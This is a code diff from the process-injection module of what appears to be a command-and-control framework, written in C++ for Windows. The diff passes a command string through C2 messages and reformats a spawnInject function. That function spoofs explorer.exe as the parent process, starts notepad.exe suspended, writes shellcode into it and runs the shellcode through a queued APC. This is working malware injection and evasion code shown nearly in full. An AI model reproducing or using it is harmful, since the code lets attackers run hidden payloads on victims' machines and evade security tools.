@@ -159,7 +159,15 @@ int Inject::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 			return -1;
 		}
 
+		std::string cmd;
+		for (int idx = 1; idx < splitedCmd.size(); idx++) 
+		{
+			cmd+=splitedCmd[idx];
+			cmd+=" ";
+		}
+
 		c2Message.set_pid(pid);
+		c2Message.set_cmd(cmd);
 		c2Message.set_instruction(splitedCmd[0]);
 		c2Message.set_inputfile(inputFile);
 		c2Message.set_data(payload.data(), payload.size());
@@ -246,17 +254,18 @@ DWORD GetPidByName(const char * pName)
 
 
 // https://cocomelonc.github.io/tutorial/2021/11/20/malware-injection-4.html
- std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn)
- {
- 	std::string result;
+std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn)
+{
+	std::string result;
 
 	STARTUPINFOEX info = { sizeof(info) };
-    PROCESS_INFORMATION pi;
+	PROCESS_INFORMATION pi;
 	SIZE_T cbAttributeListSize = 0;
 	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
 	HANDLE hParentProcess = NULL;
 	DWORD dwPid = 0;
-	
+
+	// Spoof parent ID to set explorer.exe
 	dwPid = GetPidByName("explorer.exe");
 	if (dwPid == 0)
 			dwPid = GetCurrentProcessId();
@@ -278,30 +287,30 @@ DWORD GetPidByName(const char * pName)
 
 	info.lpAttributeList = pAttributeList;
 
- 	if (CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &info.StartupInfo, &pi))
- 	{
- 		PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
- 		WriteProcessMemory(pi.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
- 		DWORD oldprotect = 0;
- 		VirtualProtectEx(pi.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
- 		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
- 		QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, NULL);
- 		ResumeThread(pi.hThread);
- 		result += "Process injected.";
- 	}
- 	else
- 	{
- 		result += "CreateProcess failed.";
- 	}
+	if (CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &info.StartupInfo, &pi))
+	{
+		PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+		WriteProcessMemory(pi.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
+		DWORD oldprotect = 0;
+		VirtualProtectEx(pi.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
+		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
+		QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, NULL);
+		ResumeThread(pi.hThread);
+		result += "Process injected.";
+	}
+	else
+	{
+		result += "CreateProcess failed.";
+	}
 
 	DeleteProcThreadAttributeList(pAttributeList);
 	CloseHandle(hParentProcess);
-	
-     return result;
- }
+
+	return result;
+}
 
 
- #endif
+#endif
 
 
 int Inject::process(C2Message &c2Message, C2Message &c2RetMessage)
@@ -316,7 +325,8 @@ int Inject::process(C2Message &c2Message, C2Message &c2RetMessage)
 	}
 	else
 	{
-		result = spawnInject(shellcode, "notepad.exe");
+		std::string processToSpawn="notepad.exe";
+		result = spawnInject(shellcode, processToSpawn);
 	}
 
 	// variantes
@@ -327,7 +337,7 @@ int Inject::process(C2Message &c2Message, C2Message &c2RetMessage)
 	// bcp d autre
 
 	c2RetMessage.set_instruction(m_name);
-	c2RetMessage.set_cmd("");
+	c2RetMessage.set_cmd(c2Message.cmd());
 	c2RetMessage.set_returnvalue(result);
 
 	return 0;
